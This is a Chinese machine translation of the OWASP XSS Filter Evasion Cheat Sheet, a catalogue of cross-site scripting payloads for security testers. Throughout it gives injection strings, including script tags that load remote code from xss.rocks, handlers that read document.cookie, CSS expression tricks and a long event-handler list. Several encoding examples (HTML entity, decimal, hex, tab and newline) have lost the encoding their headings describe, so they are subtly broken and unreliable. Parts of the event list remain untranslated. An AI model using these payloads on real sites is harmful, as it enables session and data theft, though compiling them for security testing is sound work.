# XSS 过滤器规避备忘单[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xss-filter-evasion-cheat-sheet)

## 介绍[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#introduction)

本文的重点是为应用程序安全测试专业人员提供帮助进行跨站点脚本测试的指南。本文的最初内容由 RSnake 捐赠给 OWASP，来自他开创性的 XSS 备忘单，位于：`http://ha.ckers.org/xss.html`. 该网站现在重定向到这里的新家，我们计划在那里维护和增强它。第一个 OWASP 预防备忘单，[跨站点脚本预防备忘单](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)，受到 RSnake 的 XSS 备忘单的启发，因此我们要感谢 RSnake 的启发。我们希望创建简短的指南，开发人员可以遵循这些指南来防止 XSS，而不是简单地告诉开发人员构建可以防御相当复杂的攻击备忘单中指定的所有花哨技巧的应用程序，因此[OWASP 备忘单系列](https://owasp.org/www-project-cheat-sheets/)诞生了。

## 测试[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#tests)

这份备忘单列出了一系列可用于绕过某些 XSS 防御过滤器的 XSS 攻击。请注意，输入过滤是对 XSS 的不完全防御，这些测试可以用来说明。

### 没有过滤器规避的基本 XSS 测试[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#basic-xss-test-without-filter-evasion)

这是一个普通的 XSS JavaScript 注入，很可能会被捕获，但我建议先尝试一下（在任何现代浏览器中都不需要引号，因此这里省略了）：

```
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
```

### XSS 定位器（Polygot）[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xss-locator-polygot)

下面是一个“polygot 测试 XSS 有效载荷”。该测试将在多个上下文中执行，包括 html、脚本字符串、js 和 URL。感谢[Gareth Heyes](https://twitter.com/garethheyes)的[贡献](https://twitter.com/garethheyes/status/997466212190781445)。

```
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

### 使用 JavaScript 指令的图像 XSS[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#image-xss-using-the-javascript-directive)

使用 JavaScript 指令的图像 XSS（IE7.0 不支持图像上下文中的 JavaScript 指令，但它在其他上下文中支持，但以下显示的原则也适用于其他标记：

```
<IMG SRC="javascript:alert('XSS');">
```

### 没有引号也没有分号[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#no-quotes-and-no-semicolon)

```
<IMG SRC=javascript:alert('XSS')>
```

### 不区分大小写的 XSS 攻击向量[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#case-insensitive-xss-attack-vector)

```
<IMG SRC=JaVaScRiPt:alert('XSS')>
```

### HTML 实体[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#html-entities)

为此需要分号：

```
<IMG SRC=javascript:alert("XSS")>
```

### 重音混淆[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#grave-accent-obfuscation)

如果您需要同时使用双引号和单引号，您可以使用重音符号来封装 JavaScript 字符串 - 这也很有用，因为许多跨站点脚本过滤器不知道重音符号：

```
<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
```

### 格式错误的 A 标签[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#malformed-a-tags)

跳过 HREF 属性并进入 XXS 的肉... 由 David Cross 提交 \~ 在 Chrome 上验证

```
\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>
```

或者 Chrome 喜欢为您替换丢失的引号......如果您遇到困难，只需将它们关闭，Chrome 会将它们放在正确的位置并修复您在 URL 或脚本上丢失的引号。

```
\<a onmouseover=alert(document.cookie)\>xxs link\</a\>
```

### 格式错误的 IMG 标签[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#malformed-img-tags)

最初由 Begeek 发现（但已清理并缩短以在所有浏览器中工作），此 XSS 向量使用宽松的渲染引擎在 IMG 标记中创建我们的 XSS 向量，该标记应封装在引号中。我认为这最初是为了纠正草率的编码。这将使正确解析 HTML 标签变得更加困难：

```
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
```

### 来自CharCode[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#fromcharcode)

如果不允许任何类型的引号，您可以`eval()`在`fromCharCode`JavaScript 中创建您需要的任何 XSS 向量：

```
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
```

### 默认 SRC 标记以获取过去检查 SRC 域的过滤器[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#default-src-tag-to-get-past-filters-that-check-src-domain)

这将绕过大多数 SRC 域过滤器。在事件方法中插入 JavaScript 也将适用于使用 Form、Iframe、Input、Embed 等元素的任何 HTML 标签类型注入。它还将允许替换标签类型的任何相关事件`onblur`，`onclick`如此处列出的许多注射的变化。由大卫克罗斯提交。

由 Abdullah Hussam (@Abdulahhusam) 编辑。

```
<IMG SRC=# onmouseover="alert('xxs')">
```

### 默认 SRC 标签留空[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#default-src-tag-by-leaving-it-empty)

```
<IMG SRC= onmouseover="alert('xxs')">
```

### 完全保留默认 SRC 标记[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#default-src-tag-by-leaving-it-out-entirely)

```
<IMG onmouseover="alert('xxs')">
```

### 错误警报[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#on-error-alert)

```
<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
```

### IMG onerror 和 JavaScript 警报编码[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-onerror-and-javascript-alert-encode)

<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">

### 十进制 HTML 字符引用[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#decimal-html-character-references)

所有在标签内使用 javascript: 指令的 XSS 示例`<IMG`在 Gecko 渲染引擎模式下的 Firefox 或 Netscape 8.1+ 中都不起作用）。

```
<IMG SRC=javascript:alert('XSS')>
```

### 没有尾随分号的十进制 HTML 字符引用[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#decimal-html-character-references-without-trailing-semicolons)

这在尝试查找“&#XX;”的 XSS 中通常很有效，因为大多数人不知道填充 - 最多 7 个数字字符。这对于对像 $tmp_string =\~ s/.*\&#(\d+);.*/$1/; 这样的字符串进行解码的人也很有用。它错误地假设需要分号来终止 HTML 编码的字符串（我已经在野外看到过）：

```
<IMG SRC=javascript:alert('XSS')>
```

### 没有尾随分号的十六进制 HTML 字符引用[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#hexadecimal-html-character-references-without-trailing-semicolons)

这也是针对上述字符串 $tmp_string=\~ s/.*\&#(\d+);.*/$1/; 的可行 XSS 攻击。它假设井号后面有一个数字字符 - 十六进制 HTML 字符不是这样）。

```
<IMG SRC=javascript:alert('XSS')>
```

### 嵌入式选项卡[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#embedded-tab)

用于破解跨站脚本攻击：

```
<IMG SRC="jav ascript:alert('XSS');">
```

### 嵌入式编码选项卡[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#embedded-encoded-tab)

使用这个来分解 XSS：

```
<IMG SRC="jav	ascript:alert('XSS');">
```

### 嵌入换行符来分解 XSS[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#embedded-newline-to-break-up-xss)

一些网站声称任何字符 09-13（十进制）都可以用于这种攻击。这是不正确的。只有 09（水平制表符）、10（换行符）和 13（回车符）有效。有关详细信息，请参阅 ascii 图表。以下四个 XSS 示例说明了这个向量：

```
<IMG SRC="jav ascript:alert('XSS');">
```

### 嵌入式回车分解XSS[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#embedded-carriage-return-to-break-up-xss)

（注意：上面我使这些字符串比它们必须的长，因为可以省略零。我经常看到过滤器假设十六进制和十进制编码必须是两个或三个字符。真正的规则是 1 -7 个字符。）：

```
<IMG SRC="jav ascript:alert('XSS');">
```

### Null 分解 JavaScript 指令[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#null-breaks-up-javascript-directive)

Null 字符也可以用作 XSS 向量，但不像上面那样，您需要使用 Burp Proxy 之类的东西直接注入它们或`%00`在 URL 字符串中使用，或者如果您想编写自己的注入工具，您可以使用 vim（`^V^@`将产生空值）或以下程序将其生成为文本文件。好吧，我又撒谎了，旧版本的 Opera（Windows 上大约是 7.11）容易受到一个额外的字符 173（软连字符控制字符）的攻击。但是 null char`%00`更有用，它帮助我绕过某些现实世界的过滤器，这个例子有一个变体：

```
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
```

### XSS 图像中 JavaScript 之前的空格和元字符[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#spaces-and-meta-chars-before-the-javascript-in-images-for-xss)

如果模式匹配不考虑单词中的空格（这是正确的，因为它不会呈现）并且错误地假设引号和关键字`javascript:`之间不能有空格，这将很有用。`javascript:`实际情况是您可以使用十进制 1-32 中的任何字符：

```
<IMG SRC="  javascript:alert('XSS');">
```

### 非字母非数字 XSS[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#non-alpha-non-digit-xss)

Firefox HTML 解析器假定 HTML 关键字后的非字母非数字无效，因此认为它是 HTML 标记后的空格或无效标记。问题是一些 XSS 过滤器假定他们正在寻找的标签被空格分解。例如`\<SCRIPT\\s`!= `\<SCRIPT/XSS\\s`：

```
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
```

然而，基于与上述相同的想法，使用 Rnake fuzzer 对其进行了扩展。Gecko 渲染引擎允许在事件处理程序和等号之间使用除字母、数字或封装字符（如引号、尖括号等）以外的任何字符，从而更容易绕过跨站点脚本块。请注意，这也适用于重音字符，如下所示：

```
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
```

Yair Amit 让我注意到这一点，IE 和 Gecko 渲染引擎之间的行为略有不同，只允许在标记和参数之间使用斜线，没有空格。如果系统不允许空格，这可能很有用。

```
<SCRIPT/SRC="http://xss.rocks/xss.js"></SCRIPT>
```

### 无关的开括号[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#extraneous-open-brackets)

由 Franz Sedlmaier 提交，这个 XSS 向量可以击败某些检测引擎，这些引擎首先使用匹配的开闭尖括号对，然后通过比较内部的标签，而不是像 Boyer-Moore 这样更有效的算法来寻找开尖括号和相关标签的整个字符串匹配（当然是去混淆后）。双斜杠注释掉结束的无关括号以抑制 JavaScript 错误：

```
<<SCRIPT>alert("XSS");//\<</SCRIPT>
```

### 没有关闭脚本标签[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#no-closing-script-tags)

在 Gecko 渲染引擎模式下的 Firefox 和 Netscape 8.1 中，您实际上不需要`\></SCRIPT>`此跨站点脚本向量的部分。Firefox 假定关闭 HTML 标记并为您添加关闭标记是安全的。考虑周全！与不影响 Firefox 的下一个不同，它不需要任何额外的 HTML。如果需要，您可以添加引号，但通常不需要它们，但请注意，我不知道一旦注入 HTML 最终会是什么样子：

```
<SCRIPT SRC=http://xss.rocks/xss.js?< B >
```

### 脚本标签中的协议解析[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#protocol-resolution-in-script-tags)

此特定变体由 Łukasz Pilorz 提交，部分基于 Ozh 的以下协议解析绕过。`</SCRIPT>`如果您在末尾添加标签，则此跨站点脚本示例适用于 IE、IE 呈现模式的 Netscape 和 Opera 。但是，这在空间存在问题时特别有用，当然，域越短越好。无论编码类型如何，“.j”都是有效的，因为浏览器在 SCRIPT 标记的上下文中知道它。

```
<SCRIPT SRC=//xss.rocks/.j>
```

### 半开 HTML/JavaScript XSS 向量[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#half-open-htmljavascript-xss-vector)

与 Firefox 不同，IE 渲染引擎不会向您的页面添加额外数据，但它确实允许在图像中使用 javascript: 指令。这作为向量很有用，因为它不需要右尖括号。这假设在您注入此跨站点脚本向量的下方有任何 HTML 标记。即使没有关闭“>”标签，它下面的标签也会关闭它。注意：这确实会弄乱 HTML，具体取决于它下面的 HTML。它绕过了以下 NIDS 正则表达式：`/((\\%3D)|(=))\[^\\n\]\*((\\%3C)|\<)\[^\\n\]+((\\%3E)|\>)/`因为它不需要结尾“>”。附带说明一下，这对我遇到的使用开放式`<IFRAME`标签而不是`<IMG`标签的真实世界 XSS 过滤器也有影响：

```
<IMG SRC="``('XSS')"
```

### 双开角支架[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#double-open-angle-brackets)

在矢量末尾使用开尖括号而不是闭合尖括号会导致 Netscape Gecko 渲染中的不同行为。没有它，Firefox 可以工作，但 Netscape 不能：

<iframe src=http://xss.rocks/scriptlet.html <

### 转义 JavaScript 转义[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#escaping-javascript-escapes)

当应用程序被编写为在 JavaScript 中输出一些用户信息时，如下所示：`<SCRIPT>var a="$ENV{QUERY\_STRING}";</SCRIPT>`并且您想将自己的 JavaScript 注入其中，但服务器端应用程序会转义某些引号，您可以通过转义它们的转义字符来规避这种情况。当它被注入时，它将读取`<SCRIPT>var a="\\\\";alert('XSS');//";</SCRIPT>`最终取消转义双引号并导致跨站点脚本向量触发。XSS 定位器使用这种方法：

```
\";alert('XSS');//
```

另一种方法是，如果对嵌入数据应用了正确的 JSON 或 JavaScript 转义而不是 HTML 编码，则完成脚本块并开始您自己的：

```
</script><script>alert('XSS');</script>
```

### 结束标题标签[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#end-title-tag)

这是一个简单的关闭`<TITLE>`标签的 XSS 向量，可以封装恶意跨站脚本攻击：

```
</TITLE><SCRIPT>alert("XSS");</SCRIPT>
```

### 输入图像[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#input-image)

```
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
```

### 身体形象[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#body-image)

```
<BODY BACKGROUND="javascript:alert('XSS')">
```

### IMG动态[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-dynsrc)

```
<IMG DYNSRC="javascript:alert('XSS')">
```

### IMG Lowsrc[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-lowsrc)

```
<IMG LOWSRC="javascript:alert('XSS')">
```

### 列表样式图像[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#list-style-image)

处理项目符号列表的嵌入图像的相当深奥的问题。由于 JavaScript 指令，这仅适用于 IE 渲染引擎。不是一个特别有用的跨站点脚本向量：

```
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>
```

### 图像中的 VBscript[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#vbscript-in-an-image)

```
<IMG SRC='vbscript:msgbox("XSS")'>
```

### Livescript（仅限旧版本的 Netscape）[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#livescript-older-versions-of-netscape-only)

```
<IMG SRC="livescript:[code]">
```

### SVG 对象标签[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#svg-object-tag)

```
<svg/onload=alert('XSS')>
```

### ECMAScript 6[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#ecmascript-6)

```
Set.constructor`alert\x28document.domain\x29
```

### 身体标签[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#body-tag)

方法不需要使用任何变体`javascript:`或`<SCRIPT...`来完成 XSS 攻击）。Dan Crowley 还指出，您可以在等号 ( `onload=`!= `onload =`) 之前放置一个空格：

```
<BODY ONLOAD=alert('XSS')>
```

### 事件处理程序[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#event-handlers)

它可以用于与上述类似的 XSS 攻击（在撰写本文时，这是网络上最全面的列表）。感谢 Rene Ledosquet 的 HTML+TIME 更新。

Dottoro [Web Reference](http://help.dottoro.com/)也有一个很好[的 JavaScript 事件列表](http://help.dottoro.com/ljfvvdnm.php)。

1. `FSCommand()`（当从嵌入的 Flash 对象中执行时，攻击者可以使用它）
2. `onAbort()`（当用户中止加载图像时）
3. `onActivate()`（当对象被设置为活动元素时）
4. `onAfterPrint()`（在用户打印或预览打印作业后激活）
5. `onAfterUpdate()`（更新源对象中的数据后在数据对象上激活）
6. `onBeforeActivate()`（在对象被设置为活动元素之前触发）
7. `onBeforeCopy()`（攻击者在选择被复制到剪贴板之前执行攻击字符串 - 攻击者可以使用该`execCommand("Copy")`函数执行此操作）
8. `onBeforeCut()`（攻击者在选择被剪切之前执行攻击字符串）
9. `onBeforeDeactivate()`（在 activeElement 从当前对象更改后立即触发）
10. `onBeforeEditFocus()`（在可编辑元素中包含的对象进入 UI 激活状态之前或当可编辑容器对象被控件选中时触发）
11. `onBeforePaste()`（用户需要被欺骗粘贴或使用该`execCommand("Paste")`功能强制粘贴）
12. `onBeforePrint()`（用户需要被诱骗打印或攻击者可以使用`print()`or`execCommand("Print")`功能）。
13. `onBeforeUnload()`（用户需要被诱骗关闭浏览器 - 攻击者无法卸载窗口，除非它是从父级生成的）
14. `onBeforeUpdate()`（在更新源对象中的数据之前激活数据对象）
15. `onBegin()`（当元素的时间线开始时，onbegin 事件立即触发）
16. `onBlur()`（在加载另一个弹出窗口并且窗口失去焦点的情况下）
17. `onBounce()`(fires when the behavior property of the marquee object is set to "alternate" and the contents of the marquee reach one side of the window)
18. `onCellChange()`（当数据提供者中的数据发生变化时触发）
19. `onChange()`（选择、文本或 TEXTAREA 字段失去焦点且其值已被修改）
20. `onClick()`（有人点击表格）
21. `onContextMenu()`（用户需要右键单击攻击区域）
22. `onControlSelect()`（当用户即将对对象进行控件选择时触发）
23. `onCopy()`（用户需要复制一些东西，或者可以使用`execCommand("Copy")`命令来利用它）
24. `onCut()`（用户需要复制一些东西，或者可以使用`execCommand("Cut")`命令来利用它）
25. `onDataAvailable()`（用户需要更改元素中的数据，否则攻击者可以执行相同的功能）
26. `onDataSetChanged()`（当数据源对象暴露的数据集发生变化时触发）
27. `onDataSetComplete()`（触发表示所有数据都可从数据源对象获得）
28. `onDblClick()`（用户双击表单元素或链接）
29. `onDeactivate()`（当 activeElement 从当前对象更改为父文档中的另一个对象时触发）
30. `onDrag()`（要求用户拖动对象）
31. `onDragEnd()`（要求用户拖动对象）
32. `onDragLeave()`（要求用户将对象拖离有效位置）
33. `onDragEnter()`（要求用户将对象拖到有效位置）
34. `onDragOver()`（要求用户将对象拖到有效位置）
35. `onDragDrop()`（用户将对象（例如文件）拖放到浏览器窗口中）
36. `onDragStart()`（当用户开始拖动操作时发生）
37. `onDrop()`（用户将对象（例如文件）拖放到浏览器窗口中）
38. `onEnd()`（onEnd 事件在时间线结束时触发。
39. `onError()`（加载文档或图像会导致错误）
40. `onErrorUpdate()`（在更新数据源对象中的关联数据时发生错误时在数据绑定对象上触发）
41. `onFilterChange()`（当视觉过滤器完成状态更改时触发）
42. `onFinish()`（攻击者可以在磁盘完成循环时创建漏洞利用）
43. `onFocus()`（当窗口获得焦点时，攻击者执行攻击字符串）
44. `onFocusIn()`（当窗口获得焦点时，攻击者执行攻击字符串）
45. `onFocusOut()`（当窗口失去焦点时，攻击者执行攻击字符串）
46. `onHashChange()`（当文档当前地址的片段标识符部分更改时触发）
47. `onHelp()`（当用户在窗口处于焦点时按 F1 时，攻击者执行攻击字符串）
48. `onInput()`（通过用户界面更改元素的文本内容）
49. `onKeyDown()`（用户按下一个键）
50. `onKeyPress()`（用户按下或按住一个键）
51. `onKeyUp()`（用户释放一个键）
52. `onLayoutComplete()`（用户必须打印或打印预览）
53. `onLoad()`（攻击者在窗口加载后执行攻击字符串）
54. `onLoseCapture()`（可以通过`releaseCapture()`方法利用）
55. `onMediaComplete()`（当使用流媒体文件时，该事件可能会在文件开始播放之前触发）
56. `onMediaError()`（用户在浏览器中打开一个包含媒体文件的页面，出现问题时触发该事件）
57. `onMessage()`（当文档收到消息时触发）
58. `onMouseDown()`（攻击者需要让用户点击图片）
59. `onMouseEnter()`（光标在对象或区域上移动）
60. `onMouseLeave()`（攻击者需要让用户将鼠标悬停在图像或表格上，然后再次关闭）
61. `onMouseMove()`（攻击者需要让用户将鼠标悬停在图像或表格上）
62. `onMouseOut()`（攻击者需要让用户将鼠标悬停在图像或表格上，然后再次关闭）
63. `onMouseOver()`（光标在对象或区域上移动）
64. `onMouseUp()`（攻击者需要让用户点击图片）
65. `onMouseWheel()`（攻击者需要让用户使用他们的鼠标滚轮）
66. `onMove()`（用户或攻击者会移动页面）
67. `onMoveEnd()`（用户或攻击者会移动页面）
68. `onMoveStart()`（用户或攻击者会移动页面）
69. `onOffline()`（如果浏览器在在线模式下工作并开始离线工作，则会发生）
70. `onOnline()`（如果浏览器在离线模式下工作并开始在线工作，则会发生）
71. `onOutOfSync()`（中断元素播放时间线定义的媒体的能力）
72. `onPaste()`（用户需要粘贴或攻击者可以使用该`execCommand("Paste")`功能）
73. `onPause()` (the onpause event fires on every element that is active when the timeline pauses, including the body element)
74. `onPopState()` (fires when user navigated the session history)
75. `onProgress()` (attacker would use this as a flash movie was loading)
76. `onPropertyChange()` (user or attacker would need to change an element property)
77. `onReadyStateChange()` (user or attacker would need to change an element property)
78. `onRedo()` (user went forward in undo transaction history)
79. `onRepeat()` (the event fires once for each repetition of the timeline, excluding the first full cycle)
80. `onReset()` (user or attacker resets a form)
81. `onResize()` (user would resize the window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
82. `onResizeEnd()` (user would resize the window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
83. `onResizeStart()` (user would resize the window; attacker could auto initialize with something like: `<SCRIPT>self.resizeTo(500,400);</SCRIPT>`)
84. `onResume()` (the onresume event fires on every element that becomes active when the timeline resumes, including the body element)
85. `onReverse()` (if the element has a repeatCount greater than one, this event fires every time the timeline begins to play backward)
86. `onRowsEnter()` (user or attacker would need to change a row in a data source)
87. `onRowExit()` (user or attacker would need to change a row in a data source)
88. `onRowDelete()` (user or attacker would need to delete a row in a data source)
89. `onRowInserted()` (user or attacker would need to insert a row in a data source)
90. `onScroll()` (user would need to scroll, or attacker could use the `scrollBy()` function)
91. `onSeek()` (the onreverse event fires when the timeline is set to play in any direction other than forward)
92. `onSelect()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
93. `onSelectionChange()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
94. `onSelectStart()` (user needs to select some text - attacker could auto initialize with something like: `window.document.execCommand("SelectAll");`)
95. `onStart()` (fires at the beginning of each marquee loop)
96. `onStop()` (user would need to press the stop button or leave the webpage)
97. `onStorage()` (storage area changed)
98. `onSyncRestored()` (user interrupts the element's ability to play its media as defined by the timeline to fire)
99. `onSubmit()` (requires attacker or user submits a form)
100. `onTimeError()` (user or attacker sets a time property, such as dur, to an invalid value)
101. `onTrackChange()` (user or attacker changes track in a playList)
102. `onUndo()`（用户在撤消事务历史记录中倒退）
103. `onUnload()`（当用户点击任何链接或按下后退按钮或攻击者强制点击时）
104. `onURLFlip()`（此事件在由 HTML+TIME（定时交互式多媒体扩展）媒体标签播放的高级流格式 (ASF) 文件处理嵌入在 ASF 文件中的脚本命令时触发）
105. `seekSegmentTime()`（这是一种在元素的片段时间线上定位指定点并从该点开始播放的方法。片段由时间线的一个重复组成，包括使用 AUTOREVERSE 属性进行反向播放。）

### BGSOUND[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#bgsound)

```
<BGSOUND SRC="javascript:alert('XSS');">
```

### & JavaScript 包括[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#javascript-includes)

```
<BR SIZE="&{alert('XSS')}">
```

### 样式表[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#style-sheet)

```
<LINK REL="stylesheet" HREF="javascript:alert('XSS');">
```

### 远程样式表[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#remote-style-sheet)

使用像远程样式表这样简单的东西，您可以包含您的 XSS，因为样式参数可以使用嵌入式表达式重新定义。这仅适用于 IE 和 Netscape 8.1+ 的 IE 渲染引擎模式。请注意，页面上没有任何内容表明包含 JavaScript。注意：对于所有这些远程样式表示例，它们都使用 body 标记，因此除非页面上除了矢量本身之外还有其他内容，否则它将不起作用，因此您需要在页面上添加一个字母以如果它是一个空白页，让它工作：

```
<LINK REL="stylesheet" HREF="http://xss.rocks/xss.css">
```

### 远程样式表第 2 部分[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#remote-style-sheet-part-2)

这与上面的工作方式相同，但使用`<STYLE>`标签而不是`<LINK>`标签）。这个向量的一个微小变化被用来破解谷歌桌面。`</STYLE>`附带说明一下，如果在向量之后立即有 HTML，则可以删除结束标记以将其关闭。如果您在跨站点脚本攻击中不能使用等号或斜线，这将很有用，这在现实世界中至少出现过一次：

```
<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
```

### 远程样式表第 3 部分[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#remote-style-sheet-part-3)

这仅适用于 Opera 8.0（不再适用于 9.x），但相当棘手。根据 RFC2616 设置链接头不是 HTTP1.1 规范的一部分，但是一些浏览器仍然允许它（如 Firefox 和 Opera）。这里的诀窍是我正在设置一个标头（这与 HTTP 标头中的说法基本上没有什么不同`Link: <http://xss.rocks/xss.css>; REL=stylesheet`），并且带有我的跨站点脚本向量的远程样式表正在运行 JavaScript，这在 FireFox 中不受支持：

```
<META HTTP-EQUIV="Link" Content="<http://xss.rocks/xss.css>; REL=stylesheet">
```

### 远程样式表第 4 部分[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#remote-style-sheet-part-4)

这仅适用于 Gecko 渲染引擎，并且通过将 XUL 文件绑定到父页面来工作。我认为这里具有讽刺意味的是，Netscape 认为 Gecko 更安全，因此对于绝大多数网站来说都是易受攻击的：

```
<STYLE>BODY{-moz-binding:url("http://xss.rocks/xssmoz.xml#xss")}</STYLE>
```

### 用于 XSS 的带有破碎 JavaScript 的样式标签[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#style-tags-with-broken-up-javascript-for-xss)

这个 XSS 有时会将 IE 发送到无限循环的警报中：

```
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
```

### 使用对拆分表达式的注释的 STYLE 属性[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#style-attribute-using-a-comment-to-break-up-expression)

由罗曼·伊万诺夫创作

```
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
```

### 带表情的 IMG 样式[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#img-style-with-expression)

这实际上是上述 XSS 向量的混合体，但它确实显示了 STYLE 标记的解析难度，就像上面这样可以将 IE 发送到循环中：

```
exp/*<A STYLE='no\xss:noxss("*//*");
xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
```

### 样式标签（仅限旧版本的 Netscape）[¶](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#style-tag-older-versions-of-netscape-only)

```
<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
```

